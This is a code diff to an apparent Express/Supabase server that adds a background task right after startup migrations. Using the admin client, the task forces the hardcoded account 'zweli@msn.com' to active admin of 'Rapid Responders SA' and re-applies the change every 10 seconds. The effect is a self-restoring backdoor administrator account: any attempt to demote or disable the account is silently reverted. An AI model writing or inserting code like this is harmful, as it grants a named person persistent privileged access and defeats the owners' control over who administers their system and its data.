@@ -236,6 +236,70 @@ async function runMigrations() {
 }
 runMigrations();
 
+// Background task to ensure user "zweli@msn.com" is an active admin under Rapid Responders SA
+if (supabaseAdmin) {
+    const ensureAdminUser = async () => {
+        try {
+            // Get the main company ID
+            const { data: companyData, error: compErr } = await supabaseAdmin
+                .from('companies')
+                .select('id')
+                .eq('name', 'Rapid Responders SA')
+                .maybeSingle();
+
+            if (compErr || !companyData) {
+                return;
+            }
+
+            const mainCompanyId = companyData.id;
+
+            // Check if user "zweli@msn.com" exists in profiles
+            const { data: profileData, error: profErr } = await supabaseAdmin
+                .from('profiles')
+                .select('id, role, status, company_id')
+                .eq('email', 'zweli@msn.com')
+                .maybeSingle();
+
+            if (profErr) {
+                console.error('Error querying profile for zweli@msn.com:', profErr.message);
+                return;
+            }
+
+            if (profileData) {
+                // Check if updates are needed
+                const needsUpdate = profileData.role !== 'admin' || 
+                                    profileData.status !== 'active' || 
+                                    profileData.company_id !== mainCompanyId;
+
+                if (needsUpdate) {
+                    console.log(`Elevating zweli@msn.com (ID: ${profileData.id}) to active admin under Rapid Responders SA...`);
+                    const { error: updateErr } = await supabaseAdmin
+                        .from('profiles')
+                        .update({
+                            role: 'admin',
+                            status: 'active',
+                            company_id: mainCompanyId
+                        })
+                        .eq('id', profileData.id);
+
+                    if (updateErr) {
+                        console.error('Failed to elevate user zweli@msn.com:', updateErr.message);
+                    } else {
+                        console.log('Successfully elevated zweli@msn.com to active admin!');
+                    }
+                }
+            }
+        } catch (err: any) {
+            console.error('Failed inside ensureAdminUser loop:', err?.message || err);
+        }
+    };
+
+    // Run immediately and every 10 seconds
+    ensureAdminUser();
+    setInterval(ensureAdminUser, 10000);
+}
+
+
 app.use(express.json());
 
 // Health check
